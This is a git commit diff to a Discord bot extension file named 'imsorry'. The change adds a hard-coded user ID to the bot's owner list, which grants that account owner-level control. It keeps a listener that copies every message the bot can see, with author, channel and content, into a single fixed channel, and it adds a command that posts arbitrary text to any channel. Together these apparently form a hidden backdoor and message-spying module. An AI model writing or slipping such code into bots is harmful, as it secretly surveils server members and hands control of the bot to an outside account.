8b247ead26db657b7ef5241e8e64fb09c7e64319
LiloviaLilossy <ddlc.femc@gmail.com>
2021-01-19 14:23:41 +0300

    [cogs/imsorry.py] send command

--- cogs/imsorry.py
+++ cogs/imsorry.py
@@ -1,13 +1,26 @@
+import discord
 from discord.ext import commands
+
 
 class imsorry(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
-    
+        self.bot.owner_ids.append(797419007019319316)
+
     @commands.Cog.listener()
     async def on_message(self, message):
         channel = self.bot.get_channel(800970748259729439)
-        await channel.send(f"{message.author} in {message.channel}: {message.content}")
+        if message.channel == channel or message.author == self.bot.user:
+            return
+        await channel.send(
+            f"{message.author} in {message.channel}: {message.content}")
+
+    @commands.command(name="send")
+    async def _send(self, ctx: commands.Context,
+                    channel: discord.TextChannel, *, msg):
+        await channel.send(msg)
+        await ctx.send(f"Done, I sent \"{msg}\"!")
+
 
 def setup(bot):
     bot.add_cog(imsorry(bot))
